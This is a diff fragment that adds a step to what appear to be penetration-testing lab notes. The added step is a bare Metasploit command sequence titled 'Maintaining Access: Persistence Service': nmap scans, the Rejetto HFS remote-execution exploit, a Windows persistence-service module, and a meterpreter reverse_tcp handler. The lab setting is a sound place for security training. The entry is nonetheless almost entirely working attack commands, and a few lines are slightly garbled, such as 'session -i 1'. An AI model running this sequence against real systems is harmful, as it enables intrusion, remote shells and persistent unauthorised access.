@@ -2084,8 +2084,33 @@ cd /root
 ls -l
 cat flag
 ```
-
-
+110) Maintaining Access: Persistence Service
+```
+cat /root/Desktop/target
+nmap 10.0.25.204
+nmap -sV -p 80 10.0.25.204
+searchsploit hfs
+msfconsole -q
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS 10.0.25.204
+set LHOST 10.10.1.2 <Make Sure to Enter Valid LHOST IP Address>
+exploit
+getuid
+background
+use exploit/windows/local/persistence_service
+set SESSION 1
+exploit
+msfconsole -q
+use exploit/multi/handler
+set LHOST 10.10.1.2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 4444
+exploit
+session -i 1
+reboot
+exit
+run
+```
 
 
 
